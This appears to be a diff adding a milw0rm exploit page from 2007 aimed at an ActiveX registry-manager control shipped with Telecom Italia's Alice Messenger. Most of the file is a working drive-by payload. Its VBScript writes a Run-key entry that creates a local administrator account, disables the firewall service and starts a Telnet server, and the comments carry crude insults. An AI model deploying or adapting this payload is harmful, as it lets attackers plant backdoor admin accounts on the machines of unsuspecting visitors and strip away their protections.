@@ -1,0 +1,34 @@
+<!--
+04.50 20/08/2007
+Telecom Italy Alice Messenger Hp.Revolution.RegistryManager.dll (v.1)
+remote arbitrary registry key manipulation
+
+I mean this one:
+http://aiuto.alice.it/offerte/messenger/installazione.html
+
+this was 0day for a while, but ... who knows?
+the new version suggests to remove this dll, you know telecom guy, because it sucks...
+
+Object Safety report:
+
+RegKey Safe for Script: False
+RegKey Safe for Init: False
+Implements IObjectSafety: True
+IDisp Safe:  Safe for untrusted: caller,data
+
+rgod.
+http://retrogod.altervista.org
+-->
+<html>
+<object classid='clsid:19092490-676B-4C06-A158-34F1CD2DE517' id='HPRevolutionRegistryManager' /></OBJECT>
+<script language='vbscript'>
+group="HKEY_LOCAL_MACHINE"
+section="SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
+key="sun-tzu"
+valType=1 'REG_SZ
+value="""c:\windows\system32\cmd.exe"" /c net user sun tzu /add & net localgroup Administrators sun /add & sc config SharedAccess start= disabled & net stop SharedAccess & sc config TlntSvr start= auto & net start TlntSvr & echo whatthefuck(!) & pause" 'you meretrix...
+HPRevolutionRegistryManager.WriteRegistry group ,section ,key ,valType ,value 'die of miserable death mommy
+</script>
+</html>
+
+# milw0rm.com [2007-09-03]
